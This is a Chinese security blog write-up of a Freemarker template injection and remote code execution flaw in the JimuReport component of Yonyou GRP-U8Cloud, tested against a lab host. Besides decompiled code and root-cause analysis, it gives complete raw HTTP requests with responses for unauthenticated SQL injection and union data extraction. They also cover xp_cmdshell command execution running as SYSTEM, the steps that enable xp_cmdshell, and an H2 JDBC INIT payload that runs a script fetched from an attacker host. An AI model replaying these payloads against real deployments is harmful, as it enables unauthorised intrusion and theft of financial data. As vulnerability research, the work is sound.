---
title: "用友GRP-U8Cloud产品jmreport组件模块Freemarker模板SSTI致RCE漏洞分析"
source: https://mrxn.net/jswz/yonyou-grp-u8c-jmreport-Freemarker-rce.html
asset_dir: embedded-base64
---

> **目标**：`http://192.168.168.168:8088`（用友 GRP-U8Cloud v11，局域网测试环境）  
> **组件**：`jimureport-spring-boot-starter-1.4.0.jar`（JimuReport 积木报表，集成于 U8Cloud webapps）  
> **Freemarker 版本**：`freemarker-2.3.31`  
> **漏洞类型**：Freemarker 模板注入（SSTI）→ 任意命令执行（RCE）  
> **测试时间**：2026-08-06 至  
> **目标操作系统**：Windows（`cmd /c` 命令已验证；Tomcat 工作目录 `C:\GRP-U8Cloud\U8\AppServer`）  
> **工具地址**: <https://github.com/Mr-xn/fmfuzz_tool>
>
> Java（编程语言）

---

# 1. 漏洞概述

深入探索

data

计算机科学

脚本语言

JimuReport（积木报表）是 JeecgBoot 生态的报表组件，GRP-U8Cloud 将其以 `jimureport-spring-boot-starter-1.4.0.jar` 形式集成。该版本存在 **Freemarker 模板注入漏洞**：

1. 用户可控输入（`sql` 参数 / `dbDynSql` [数据](#)库模板字段）被拼入 Freemarker 模板；
2. 渲染时 `Configuration.setClassicCompatible(true)` 且 **未做任何危险类过滤**（无沙箱）；
3. 攻击者可通过 `?new()` 内置函数实例化 `freemarker.template.utility.Execute` 或 `ObjectConstructor`（可构造任意对象，包括 `java.lang.ProcessBuilder`）实现 **[任意命令执行](https://mrxn.net/tag/rce "标签：任意命令执行")**。

关键结论：

- **同一渲染调用链上共发现并实证 5 个 [rce](https://mrxn.net/tag/rce "标签：rce") 入口**：`queryFieldBySql`、`loadTableData`（直传型），`show`、`exportAllExcel`、`exportPdf`（库表型，需先写库）。
- **`@JimuLoginRequired` 注解形同虚设**：`save` / `saveDb` 等写接口在无 token 情况下直接可写。攻击者可**完全自主构建恶意报表**，使 `show` 链从"条件性利用"升级为"无条件利用"，且写入的恶意数据集**持久化在数据库中**，可反复触发。
- 已实证的利用方式为[命令执行](https://mrxn.net/tag/rce "标签：命令执行") + 相对路径穿越写文件到 `webapps` 目录（`..\U8System\Tomcat\webapps\r7.png`），HTTP 访问返回 200 确认落盘。

---

# 2. 代码分析（反编译证据）

深入探索

网络安全

DATA

Database

以下代码均反编译自 `webapps/WEB-INF/lib/jimureport-spring-boot-starter-1.4.0.jar`（类经过混淆，方法名为单字母）。

C 与 C++

## 2.1 渲染链核心：FreeMarkerUtils

`org.jeecg.modules.jmreport.desreport.render.utils.FreeMarkerUtils` 的静态渲染方法——**所有 [rce](https://mrxn.net/tag/rce "标签：rce") 的最终 Sink**：

```
public static String a(String string, Map<String, Object> map) {
    if (string == null) {
        return null;
    }
    Configuration configuration = new Configuration();           // 全新配置，无沙箱
    configuration.setNumberFormat("#.#########");
    configuration.setSharedVariable("func", (TemplateModel)new FunctionMethod());
    map.put("jeecg", new a());
    map.put("isNotEmpty", new b());
    configuration.setClassicCompatible(true);                    // 经典兼容模式 → ?new() 可用
    StringWriter stringWriter = new StringWriter();
    try {
        new Template("template", (Reader)new StringReader(string), configuration)
            .process(map, (Writer)stringWriter);                 // 直接渲染用户输入
    } catch (TemplateException templateException) {
        templateException.printStackTrace();
    } catch (IOException iOException) {
        iOException.printStackTrace();
    }
    return stringWriter.toString();
}
```

**漏洞根因**：

- `setClassicCompatible(true)` 是 `?new()` 内置函数生效的必要条件；
- 无 `freemarker.core.Configurable` 沙箱（`TemplateClassResolver` 未设置，默认允许任意类实例化）；
- 模板内容来自用户输入，无任何转义/白名单。

`?new()` 即 `freemarker.template.utility.ObjectConstructor`（FreeMarker 2.3.x 内建），可构造**任意有 public 构造器的类**——本报告中用它实例化 `freemarker.template.utility.Execute`（字符串参数[命令执行](https://mrxn.net/tag/rce "标签：命令执行")）与 `java.lang.ProcessBuilder`（进程数组启动）。

计算机安全

## 2.2 直传型入口：queryFieldBySql / loadTableData

控制器 `org.jeecg.modules.jmreport.desreport.a.a`（DesignReportController，`@RequestMapping("/jmreport")`）：

```
@PostMapping(value={"/queryFieldBySql"})
public Result<?> a(@RequestBody JSONObject jSONObject) {
    String string = jSONObject.getString("sql");        // ← 用户直传 SQL 模板
    String string2 = jSONObject.getString("dbSource");
    Object object = jSONObject.get("paramArray");
    ...
    Map map = this.reportDbService.parseReportSql(string, string2, object, string3);
    ...
}
```

Service 实现 `org.jeecg.modules.jmreport.desreport.service.a.i`（parseReportSql 反编译片段，来自实测输出回显的堆栈类）：

黑客与破解

```
public Map<String, Object> parseReportSql(String sql, String dbKey, Object paramArray, String type) {
    ...
    sql = e.a((String)sql, null, (Object)paramArray);   // 渲染函数：替换参数 + FreeMarker 渲染
    ...
}
```

`util.e` 类中该渲染方法的字节码（[java](#)p 确认）：

```
// 遍历 paramArray，paramValue 交给 Aviator 表达式引擎 express.b.a 求值
// 将结果替换回 SQL 中的 ${paramName} 与 '${paramName}' 占位符
286: aload_1            // sql
287: aload_3            // map
288: invokestatic FreeMarkerUtils.a:(Ljava/lang/String;Ljava/util/Map;)Ljava/lang/String;   // ← SSTI Sink
291: areturn
```

`/jmreport/loadTableData` 与 `/jmreport/queryFieldBySql` 最终都走到 `e.a(sql, paramArray)` → `FreeMarkerUtils.a(sql, map)`。实测两个入口均确认模板执行。

编程

## 2.3 库表型入口：getBaseSql 渲染 dbDynSql

`org.jeecg.modules.jmreport.desreport.service.a.e`（JimuReportServiceImpl）中 `getBaseSql(JmReportDb, JSONObject)`：

```
// 关键字节码：
//  - 遍历 JmReportDbParam 列表，searchFlag=1 时取 queryParam 中的值，否则取 paramValue
//  - dbDynSql + paramsMap 交给 e.b 处理 where 参数
313: aload_5                                    // dbDynSql（数据库里存的 SQL 模板）
315: aload_9                                    // paramsMap
317: invokestatic FreeMarkerUtils.a:(Ljava/lang/String;Ljava/util/Map;)Ljava/lang/String;   // ← SSTI Sink
320: astore_5
322: aload_5
324: areturn
```

`dbDynSql` 来自 `jmreport_jm_report_db` 表（`JmReportDb` 实体），通过 `/jmreport/saveDb` 写入、`/jmreport/show`、`/jmreport/exportAllExcel`、`/jmreport/exportPdf` 等渲染入口触发。**该链路证实：攻击者写入的模板会被持久化并在报表渲染时反复执行**。

## 2.4 决定性发现：@JimuLoginRequired 形同虚设

`saveDb` 与 `save` 端点均标注了 `@JimuLoginRequired`，但该注解**没有任何生效的拦截器实现**——实测不带任何 Cookie / Authorization 头直接调用即返回成功写入。这意味着攻击面从"需要先拿到一个合法报表 id 才能利用"升级为：

软件实用程序

1. 攻击者无凭证即可 `saveDb` 写入任意 `dbDynSql` 模板；
2. 无凭证即可 `save` 创建/更新报表，把[数据](#)集绑定到报表；
3. 无凭证即可调用 `show` / `exportAllExcel` / `exportPdf` 触发渲染[执行命令](https://mrxn.net/tag/rce "标签：执行命令")。

`saveReport` 的语义（字节码确认）：JSON 顶层字段 `excel_config_id` 指定要更新的报表 id；`jsonStr` 保存为移除 `designerObj` 之后的整个 JSON。**本测试中 `{"id":""}` 的 naive 调用会创建一条 `jsonStr=null` 的垃圾报表**（后续 show 时 NPE 500），正确用法必须带 `excel_config_id`。

## 2.5 潜在注入面：paramArray → Aviator 表达式（ 已完整调查）

### 2.5.1 反编译确认的注入链

`queryFieldBySql` 的 `paramArray` 字段（JSON 数组）沿以下链路进入表达式引擎：

Java（编程语言）

```
POST /jmreport/queryFieldBySql
{"sql": "select '${p}' as val", "paramArray": [{"paramName":"p","paramValue":"=1+1"}]}

controller a.a(JSONObject)            paramArray = jSONObject.get("paramArray")
  → service.i.parseReportSql(sql, dbKey, paramArray, type)
      → util.e.a(sql, null, paramArray)                ← 3 参版本
          ├─ SqlInjectionUtil.specialFilterContentForOnlineReport(sql)   ← 过滤对象是 sql, 不含 paramValue
          ├─ util.e.b(sql, map)                        #{...} 替换
          ├─ util.e.a(paramArray, sql)                 ← ★ paramArray 处理
          │    ├─ JSONArray.parseArray(String.valueOf(paramArray))       ← fastjson 解析
          │    ├─ 每项取 paramName / paramValue
          │    ├─ paramValue → express.b.a(paramValue, null)             ← ★★ Aviator 执行点
          │    │    └─ "=" 前缀 → AviatorEvaluator.newInstance().compile(expr).execute(new HashMap())
          │    │         (实例仅设 Options.TRACE_EVAL, 无安全 FeatureSet)
          │    ├─ string.replace("${"+paramName+"}", 结果)  及 '${paramName}' 形态
          │    └─ FreeMarkerUtils.a(sql, hashMap)      ← ★★★ freemarker 渲染(new Template(sql).process, classicCompatible=true)
          └─ util.e.a(sql, "$")                        残余 ${...} where/and/or 归一化
```

关键事实：

数据管理

1. **`express.b.a(String, Map)` 的执行条件**（反编译）：paramValue `trim()` 后以 `=` 开头即  
   `compile(expr).execute(new HashMap())`（**注意是 `replace("=", "")` 替换全部等号**，表达式中  
   的 `==` 会被破坏；非 `=` 前缀原样返回）
2. **paramValue 完全不过滤**：`specialFilterContentForOnlineReport` 只作用于 sql（parseReportSql  
   开头执行），paramValue 独立注入、结果原样替换进 sql——**绕过过滤的独立通道**
3. **FreeMarkerUtils.a 是无条件渲染点**：3 参版本对 paramArray 为 `null`/`[]` 的请求同样调用  
   `FreeMarkerUtils.a(sql, map)`（`new Template(sql).process(map)`，classicCompatible=true）——  
   **这就是主 RCE 渲染点**（§2.1），paramArray 的有无只决定是否额外执行 Aviator

### 2.5.2 Aviator 4.2.6 能力边界（目标 jar 本地实测）

用 WEB-INF/lib 真实 `aviator-4.2.6.jar` 编译执行验证（/tmp/AviTest\* 系列，全部无害表达式）：

字典与百科全书

| 表达式形态 | 结果 | 说明 |
| --- | --- | --- |
| `1+1`、`10 % 3` | ✅ 2 / 1 | 数学运算 |
| `string.substring('FMV-8888',0,4)`、`string.length(...)`、`string.contains(...)`、`string.join(...)` | ✅ FMV- / 8 / true / a-b-c | 内置函数命名空间 |
| `math.pow(2,10)`、`math.round(3.6)` | ✅ 1024.0 / 4.0 | 内置函数（注意小写，`Math.pow` 大写不行） |
| `seq.list(...)`、`print(...)`、`sysdate()` | ✅ | seq 函数 / print / jmreport 注册函数 |
| `java.lang.System.getProperty('user.name')` | ❌ FunctionNotFound | 静态方法链不可用 |
| `Math.pow(2,10)` | ❌ FunctionNotFound | 大写类名同样不可用 |
| `'a'.toUpperCase()` | ❌ 语法错误 | 字符串字面量不支持 `.` 方法调用 |
| `import java.lang.System; ...` / `#import("...")` | ❌ 语法错误 / 函数缺失 | 模块导入不可用 |
| `toUpperCase('fmv')`（函数式实例反射） | ❌ FunctionNotFound | jar 内 `JavaMethodReflectionFunctionMissing` 存在但**未挂载** |
| `new ArrayList()` | ❌ 语法错误 | 无构造/实例化语法 |

根因：**aviator-4.2.6 无 Feature 枚举包**（`jar tf` 确认无 `com/googlecode/aviator/feature/`），  
不存在 StaticMethod / NewInstance 等特性开关，`FunctionMissing` 钩子也未挂载——表达式求值  
**不可能触达任意 [Java](https://mrxn.net/tag/Java "标签：Java") 类方法**。结论：**paramArray→Aviator 为表达式求值级注入（任意算术/内置  
函数），无命令执行、无反射、无文件/网络操作能力**，影响显著低于 freemarker SSTI 主链。

C 与 C++

### 2.5.3 附加发现

- **A. 主渲染点定位**：§2.1 渲染链的调用方确认是 `util.e.a(String, Map, Object)` 3 参版本  
  末尾无条件调用的 `FreeMarkerUtils.a`——paramArray 有无都渲染，P1-P12 混淆谱系绕过的过滤  
  与渲染点关系闭环
- **B. 零过滤 SQL 注入通道（ 目标实测确认）**：paramValue 为任意字符串时**原样替换  
  进 sql 并由 JDBC 真实执行**（绕过 SqlInjectionUtil.specialFilterContentForOnlineReport——过滤对象  
  是 sql 原文，paramValue 在过滤后注入）。实测要点与证据：

  编程

  - **paramArray 请求结构（实测发现）**：目标端必须传 **JSON 字符串**形态  
    `"paramArray": "[{\"paramName\":\"p\",\"paramValue\":\"...\"}]"`；直接传数组对象  
    `[{"paramName":...}]` 报 `expect ':' at 0`（500，fastjson 解析异常），传对象形态报  
    `syntax error, expect [, actual {`
  - **[数据](#)库确认：SQL Server**（报错泄漏 `com.microsoft.sqlserver.jdbc.SQLServerException`；  
    注入 `--` 注释生效而 `#` 注释失败）
  - **字段名回显（queryFieldBySql，无鉴权）**：paramValue `1' as inj --` → 最终  
    `select '1' as inj --' as val` → 响应 fieldList 列名由 val 变为 **inj**
  - **数据回显（/jmreport/loadTableData，无 @JimuLoginRequired 鉴权，回显数据行）**：  
    paramValue `x' as val union select 'DATA-OK' as val--` → 最终  
    `select 'x' as val union select 'DATA-OK'`（`--` 注释掉尾部）→ 响应  
    `records: [{"val":"x"},{"val":"DATA-OK"}]`——union 注入数据完整回显
  - **形态适配要点**：SQL Server union 结果列名取第一个 SELECT（两侧别名须一致，否则  
    wrapper 引用报 `列名无效`/8155）；loadTableData 分页 wrapper 按解析出的最后 select  
    列表项引用列名；select 列表不允许布尔比较表达式（`'x'='x'` 报 `关键字 'AS' 附近语法错误`）
  - **拖库能力证明（，只读元数据）**：union 读 `sysobjects` 表名完整回显——  
    `x' as val union select top 3 name as val from sysobjects--` → `sysclones`/`sysrowsets`/  
    `sysrscols`；`where xtype='U'` 过滤用户表 → **FA\_KP、FEM\_CZRZ、GL\_Dlzgsnr、HBG\_TB\_VER\_JFB、  
    Pub\_DJLXFzx**（典型 GRP-U8 业务表：FA *固定资产、GL* 总账、Pub\_ 公共档案），确认目标库为  
    用友账套库；同一形态可将 `name` 换为任意列/表读取账务数据（本次未做，保持只读边界）
  - 全部实测 payload 仅改查询返回内容（别名/常量行/表名），未触碰数据；注入进 sql 的报错回显  
    本身即可作无回显确认手段
- **C. 堆叠查询不支持，但 call 前缀存储过程通道 = 直接 RCE（ 目标实测确认）**：
  - **堆叠结论（双证据）**：paramValue 注入 `x' as val; select 'STACK-OK' as val--`（`;` 分隔多语句）：  
    queryFieldBySql 报 `解析失败`；loadTableData 报错泄漏完整执行 SQL——  
    `select count(0) from ( select 'x' as val; select 'STACK-OK' as val--' as val ) tmp_co...`——  
    注入 sql 在查询路径被包进**分页 count 子查询**（selectPageBySql wrapper），SQL Server 子查询内  
    `;` 多语句非法，**传统堆叠不可用**；该报错同时再次泄漏"注入后完整 SQL 文本"
  - **参数陷阱（实测）**：loadTableData 查询路径必须带 `pageNo`/`pageSize`（缺则内部 NPE 报  
    `SQL执行失败，{}null`——此前成功请求均带 pageNo=1&pageSize=10）；executeProcedure（call）通道  
    不受此限制
  - **call 通道（反编译证据）**：`loadTableData` 在 `e.a(sql, paramArray)` 渲染替换后调用  
    `e.f(sql)`：sql **trim 后以 `call` 开头（大小写不敏感）** 即返回 `{` + sql + `}`（JDBC  
    CallableStatement 转义语法），非 call 开头返回 null 走查询路径；非空分支 →  
    `jmreportDynamicDbUtil.executeProcedure(dbKey, string2)` →  
    `JdbcTemplate.execute(procedure, CallableStatementCallback)`（回调首行即  
    `CallableStatement.executeQuery()` 收集结果集）——**JDBC 直接执行存储过程，绕过全部分页  
    包装，结果集经 e.b 回显为 records**
  - **xp\_cmdshell RCE 实证（只读 whoami，符合无害约束）**：`sql=call xp_cmdshell('whoami')`  
    → `{"success":true,"code":200,"result":{"records":[{"output":"nt authority\\system"},{"output":null}]}}`  
    ——**xp\_cmdshell 已启用**（默认禁用，该环境已开），以 **SYSTEM 权限**执行，命令输出逐行回显
  - **配置查值确认（union 查 sys.configurations）**：`show advanced options=1`、`xp_cmdshell=1`
  - **开启序列（未启用目标用）**：`call sp_configure('show advanced options',1)` →  
    `call reconfigure()` → `call sp_configure('xp_cmdshell',1)` → `call reconfigure()` →  
    `call xp_cmdshell('<cmd>')`。实测：sp\_configure/reconfigure 请求返回 `SQL执行失败，{}null`  
    **属预期**——executeProcedure 回调用 `executeQuery()` 取结果集，二者不返回结果集必然抛异常，  
    但 JDBC 先执行过程再取结果集，**配置变更已实际执行**（RECONFIGURE 立即生效无需重启）；  
    以最后一步 xp\_cmdshell 的输出判断是否开启成功。开启为持久服务器配置变更，仅限授权测试环境
  - **通用性**：`call sp_who()` 对照同样成功（完整回显会话列表）——**任意存储过程执行 + 结果  
    回显**的通用通道，`call xp_cmdshell('<任意命令>')` 即系统命令执行，输出回显
  - [数据](#)库连接账号 `sa`（sp\_who 输出 loginame=sa，sysadmin 角色）→ xp\_cmdshell 权限完整；  
    本次仅执行只读 whoami 证明，未执行其他命令
- **D. HTTP raw 报文实录（完整无省略， 目标实测）**：以下请求报文与响应均为测试环境  
  完整实录——请求体即线上字节（JSON 接口原样展示；表单接口展示 urlencoded 后字节），响应为  
  完整 JSON 未截断。表单字段顺序：dbSource/sql/paramArray/tableName/pageNo/pageSize。

  Java（编程语言）

  1) **queryFieldBySql 字段名回显**（paramValue `1' as inj --`，列名 val→inj）：

  ```
  POST /jmreport/queryFieldBySql HTTP/1.1
  Host: 192.168.168.168:8088
  Content-Type: application/json
  Content-Length: 133

  {"sql": "select '${p}' as val", "dbSource": "", "paramArray": "[{\"paramName\":\"p\",\"paramValue\":\"1' as inj --\"}]", "type": "0"}
  ```

  ```
  {"success":true,"message":"解析成功","code":200,"result":{"paramList":[],"fieldList":[{"fieldName":"inj","fieldText":"inj","widgetType":"String","orderNum":1}]},"timestamp":1786199872684}
  ```

  2) **loadTableData 数据回显**（paramValue `x' as val union select 'DATA-OK' as val--`）：

  ```
  POST /jmreport/loadTableData HTTP/1.1
  Host: 192.168.168.168:8088
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 200

  dbSource=&sql=select+%27%24%7Bp%7D%27+as+val&paramArray=%5B%7B%22paramName%22%3A%22p%22%2C%22paramValue%22%3A%22x%27+as+val+union+select+%27DATA-OK%27+as+val--%22%7D%5D&tableName=&pageNo=1&pageSize=10
  ```

  ```
  {"success":true,"message":"","code":200,"result":{"total":[{"val":"x"},{"val":"DATA-OK"}],"records":[{"val":"x"},{"val":"DATA-OK"}]},"timestamp":1786199872762}
  ```

  3) **loadTableData 表名读取**（sysobjects xtype='U'，GRP-U8 账套库业务表）：

  计算机安全

  ```
  POST /jmreport/loadTableData HTTP/1.1
  Host: 192.168.168.168:8088
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 235

  dbSource=&sql=select+%27%24%7Bp%7D%27+as+val&paramArray=%5B%7B%22paramName%22%3A%22p%22%2C%22paramValue%22%3A%22x%27+as+val+union+select+top+5+name+as+val+from+sysobjects+where+xtype%3D%27U%27--%22%7D%5D&tableName=&pageNo=1&pageSize=10
  ```

  ```
  {"success":true,"message":"","code":200,"result":{"total":[{"val":"FA_KP"},{"val":"FEM_CZRZ"},{"val":"HBG_TB_VER_JFB"},{"val":"x"}],"records":[{"val":"FA_KP"},{"val":"FEM_CZRZ"},{"val":"HBG_TB_VER_JFB"},{"val":"x"}]},"timestamp":1786199872787}
  ```

  4) **loadTableData 配置查值**（sys.configurations 确认 xp\_cmdshell=1 / show advanced options=1）：

  ```
  POST /jmreport/loadTableData HTTP/1.1
  Host: 192.168.168.168:8088
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 340

  dbSource=&sql=select+%27%24%7Bp%7D%27+as+val&paramArray=%5B%7B%22paramName%22%3A%22p%22%2C%22paramValue%22%3A%22x%27+as+val+union+select+name%2B%27%3D%27%2Bconvert%28varchar%285%29%2Cvalue_in_use%29+as+val+from+sys.configurations+where+name+in+%28%27xp_cmdshell%27%2C%27show+advanced+options%27%29--%22%7D%5D&tableName=&pageNo=1&pageSize=10
  ```

  ```
  {"success":true,"message":"","code":200,"result":{"total":[{"val":"show advanced options=1"},{"val":"x"},{"val":"xp_cmdshell=1"}],"records":[{"val":"show advanced options=1"},{"val":"x"},{"val":"xp_cmdshell=1"}]},"timestamp":1786199808697}
  ```

  5) **loadTableData 堆叠探测**（`;` 多语句，报错泄漏分页包装 SQL——堆叠不支持证据）：

  软件实用程序

  ```
  POST /jmreport/loadTableData HTTP/1.1
  Host: 192.168.168.168:8088
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 198

  dbSource=&sql=select+%27%24%7Bp%7D%27+as+val&paramArray=%5B%7B%22paramName%22%3A%22p%22%2C%22paramValue%22%3A%22x%27+as+val%3B+select+%27STACK-OK%27+as+val--%22%7D%5D&tableName=&pageNo=1&pageSize=10
  ```

  ```
  {"success":false,"message":"SQL执行失败，{}PreparedStatementCallback; uncategorized SQLException for SQL [select count(0) from ( \nselect 'x' as val; select 'STACK-OK' as val--' as val\n ) tmp_co","code":500,"result":null,"timestamp":1786199848364}
  ```

  6) **loadTableData call 通道——xp\_cmdshell 命令执行**（RCE 实证，只读 whoami）：

  ```
  POST /jmreport/loadTableData HTTP/1.1
  Host: 192.168.168.168:8088
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 98

  dbSource=&sql=call+xp_cmdshell%28%27whoami%27%29&paramArray=%5B%5D&tableName=&pageNo=1&pageSize=10
  ```

  ```
  {"success":true,"message":"","code":200,"result":{"records":[{"output":"nt authority\\system"},{"output":null}]},"timestamp":1786199831314}
  ```

  7) **loadTableData call 通道——sp\_configure 开启步骤**（无结果集报错属预期，配置已执行）：

  数据管理

  ```
  POST /jmreport/loadTableData HTTP/1.1
  Host: 192.168.168.168:8088
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 118

  dbSource=&sql=call+sp_configure%28%27show+advanced+options%27%2C1%29&paramArray=%5B%5D&tableName=&pageNo=1&pageSize=10
  ```

  ```
  {"success":false,"message":"SQL执行失败，{}null","code":500,"result":null,"timestamp":1786199767xxx}
  ```

  其余开启步骤同构：`call reconfigure()`、`call sp_configure('xp_cmdshell',1)`、`call reconfigure()`；  
  全部返回上述"SQL执行失败，{}null"（executeQuery 无结果集），最后 `call xp_cmdshell('whoami')`  
  验证（报文 6 形态）返回 SYSTEM 权限输出即开启成功。

### 2.5.4 端到端验证（本地，真实 jar 全链路）

工具 `fmfuzz.jar --param-avi EXPR` 生成成品 → fastjson 1.2.83 解析 → aviator 4.2.6 真实求值 →  
替换 `${p}` → freemarker 2.3.31 渲染（/tmp/E2E.[Java](https://mrxn.net/tag/Java "标签：Java")），全部命中：

编程

```
--param-avi '1+1'                                → 最终 sql: select '2' as val
--param-avi '1+1' -J -j 1（全\u 转义形态）         → 最终 sql: select '2' as val
--param-avi "string.substring('FMV-8888',0,4)"   → 最终 sql: select 'FMV-' as val
--param-avi 'sysdate()'                          → 最终 sql: select '<服务器日期>' as val
```

FreeMarkerUtilsAviator 引擎util.e 工具类queryFieldBySql 控制器攻击者FreeMarkerUtilsAviator 引擎util.e 工具类queryFieldBySql 控制器攻击者paramValue 不过滤且独立注入POST 含 paramArray 与 select 模板 sqlparseReportSql 传入 paramArray过滤 sql 原文(不含 paramValue)paramValue 以等号开头时编译执行返回表达式求值结果结果替换 sql 中的参数占位符无条件 freemarker 渲染 sql渲染后 sql 执行查询并回显

---

## 2.6 决定性发现：testConnection 无鉴权 JDBC 任意连接（ 目标实测）

### 2.6.1 反编译确认的接口与连接链

`DesignReportController`（混淆名 `a` 类，`/jmreport` 前缀）中存在**无鉴权**[数据](#)源测试连接接口：

字典与百科全书

```
@PostMapping(value={"/testConnection"})              // 无 @JimuLoginRequired、无 HttpServletRequest
public Result a(@RequestBody JmreportDynamicDataSourceVo vo) {
    Connection connection = null;
    try {
        if (this.jmreportNoSqlUtil.isHave(JmConst.NO_SQL, vo.getDbType())) {   // NoSQL 分支
            boolean bl = this.jmreportNoSqlUtil.testConnection(vo);
            if (bl) { ... return; }
            return Result.error("数据库连接失败：错误未知");
        }
        Class.forName(vo.getDbDriver());              // ← 任意类加载（initialize=true 执行静态块）
        DriverManager.setLoginTimeout(60);
        connection = DriverManager.getConnection(     // ← 任意 JDBC URL + user/pass
            vo.getDbUrl(), vo.getDbUsername(), vo.getDbPassword());
        if (connection != null) return Result.OK("数据库连接成功", true);
        ...
    }
    catch (ClassNotFoundException e) { return Result.error("数据库连接失败：驱动类不存在"); }
    catch (Exception e) { return Result.error("数据库连接失败：" + e.getMessage()); }  // ← 异常原文回显
    finally { if (connection != null && !connection.isClosed()) connection.close(); }
}
```

- **无鉴权**：方法无 `@JimuLoginRequired`、无 HttpServletRequest（注解需从请求取 token，此方法根本没有）→  
  实测无 token 直调返回业务响应（非 401/403）
- **全参数可控**（VO 字段，JSON body 直传）：`dbDriver` / `dbUrl` / `dbUsername` / `dbPassword` / `dbType`
- **连接链**：`Class.forName(dbDriver)`（类不存在 → "驱动类不存在"）→ `DriverManager.getConnection(dbUrl, user, pass)`  
  ——**裸 DriverManager，无连接池、无 URL 白名单**，按 URL 前缀匹配 classpath 全部已注册驱动
- **异常原文回显**：`exception.getMessage()` 直接拼进返回 JSON

classpath 全部 JDBC 驱动（均可被任意调用，`WEB-INF/lib` 清单）：

计算机安全

| 驱动 | jar | 可利用面 |
| --- | --- | --- |
| **H2** | h2-2.2.224.jar | **INIT 通道：连接阶段执行任意 SQL/[Java](#)（实测，见 2.6.3）** |
| MySQL | mysql-connector-[java](#)-8.0.25.jar | 出站 TCP + 认证（SSRF）；autoDeserialize 需查询触发，此接口不可用 |
| jTDS | jtds-1.3.1.jar | 出站 TCP（SSRF） |
| SQL Server | sqljdbc4-4.1.jar | 出站 TCP（SSRF） |
| Oracle | ojdbc6-11.2.0.jar | 出站 TCP（SSRF） |
| 达梦/瀚高/金仓/神通 | Dm7 / Hgdb / kingbase8 / oscar | 出站 TCP（SSRF） |
| HikariCP / Druid | 连接池（另路 getHikariDataSource/getDruidDataSource 用） | 本接口不经过 |

NoSQL 分支（dbType 含 `redis`/`mongodb` 关键字即进入 `JmreportNoSqlUtil.testConnection`）：

- **Redis**：`new Jedis(HostAndPort.parseString(dbUrl))` + `jedis.auth(dbPassword)` + `jedis.ping()`  
  ——**实测根因 500**：classpath 为 jedis-2.9.0（javap 确认**无 `Jedis(HostAndPort)` 构造**，仅有  
  String/int/SSL 系），jmreport 按更高版本 jedis 编译 → 运行期 `NoSuchMethodError`（Error 子类  
  **逃逸 `catch(Exception)`**）→ 全局 500 "服务器出错，请重试"；**出站永不发生，Redis 面实际不可利用**
- **MongoDB**：`new MongoClient(host:port)` + SCRAM-SHA-1 认证握手，`connectTimeout(3)` 毫秒  
  硬编码 → 实测返回"[数据](#)库连接失败：错误未知"（API 匹配、异常正常捕获）；3ms 超时出站几乎不可达

### 2.6.2 JNDI 面结论（代码级）

- `DriverManager.getConnection` 本身不支持 `jdbc:jndi:` 协议；classpath **无 commons-dbcp /  
  tomcat-jdbc** → DBCP/Tomcat 的 JNDI 数据源协议不可用
- **实际的"JNDI 级"面 = H2 引擎内任意 SQL/Java 执行**（INIT 通道，见 2.6.3）：  
  远程脚本执行（RUNSCRIPT FROM http）、内联 [Java](#) 源码编译（CREATE ALIAS）、任意静态方法引用  
  （CREATE ALIAS FOR 类.方法）、任意路径文件创建（file 模式）
- MySQL 8.0.25 的 autoDeserialize/queryInterceptors [反序列化](https://mrxn.net/tag/rce "标签：反序列化")链需要**连接后执行 SELECT**  
  触发，本接口仅建连即 close → 不可用

### 2.6.3 实测证据（全部无害形态，）

| # | 测试 | 请求要点 | 实测结果 |
| --- | --- | --- | --- |
| 1 | 无鉴权 | 无任何 token 直调 | `{"success":false,"message":"数据库连接失败：驱动类不存在",...}` ——业务响应非 401 ✓ |
| 2 | 驱动类加载 | `dbDriver=com.nonexist.DriverX` | 回显"驱动类不存在" → `Class.forName(dbDriver)` 确认执行 + 错误回显 ✓ |
| 3 | **SSRF + 远程 SQL 脚本执行** | `dbDriver=org.h2.Driver`，`dbUrl=jdbc:h2:mem:fmvprobe;INIT=RUNSCRIPT FROM 'http://192.168.168.167:8001/init.sql'`（脚本内容：`CREATE ALIAS IF NOT EXISTS FMV_PROBE FOR 'java.lang.System.getProperty';`，纯定义无副作用） | 攻击机监听日志 `192.168.168.168 GET /init.sql 200` + 返回"数据库连接成功"——**INIT 在连接阶段执行了攻击机可控的远程 SQL 脚本** ✓ |
| 4 | **H2 内联 Java 源码编译（RCE 链关键环节）** | init2.sql 内容：`CREATE ALIAS IF NOT EXISTS FMV_COMPILE AS 'String fmvCompile(){ return "FMV-COMPILE-OK"; }';` | 目标 GET /init2.sql 200 + 连接成功（Java 源码**编译通过**）→ 脚本中追加 `CALL <别名>(...)` 即在目标 JVM 内执行任意 Java 代码，**连接建立即触发、无需后续查询**（[java](#)c 由 H2 调 JSR-199 API，Tomcat 进程为 JDK 时可用）✓ |
| 5 | **任意路径文件创建** | `dbUrl=jdbc:h2:file:../U8System/Tomcat/webapps/fmvprobe`（工作目录相对路径，与既知 io-write 链同目录） | 连接成功 → `http://192.168.168.168:8088/fmvprobe.mv.db` **HTTP 200，16,384 字节**——无鉴权在 webapps 下创建文件 ✓ |
| 6 | INIT 对照（证明 INIT 真实执行） | `dbUrl=...;INIT=THIS IS NOT VALID SQL` | 回显 H2 语法错误 `[42001-224]`——INIT 内容被真实解析执行 ✓ |
| 7 | Redis 分支 | `dbType=redis`，dbUrl 指向攻击机监听 6390 | 0.015s 内返回全局 500；攻击机 30s 无任何连接——NoSuchMethodError 确认（2.6.1），出站不发生 ✓（负面证据） |
| 8 | MongoDB 分支 | `dbType=mongodb`，dbUrl 指向攻击机 6391 | 返回"[数据](#)库连接失败：错误未知"，0.013s 即失败（connectTimeout=3ms）✓（负面证据） |
| 9 | **后缀控制（H2 直写模式，负面）** | `dbUrl=jdbc:h2:file:../U8System/Tomcat/webapps/fmvprobe2.jsp` | 实际生成 `fmvprobe2.jsp.mv.db`（16KB，头 `H:2,bloc` = H2 MVStore magic），URL `/fmvprobe2.jsp` 404 → **H2 直写自动追加 `.mv.db` 且内容为数据库格式，无法直接产出可执行 JSP** |
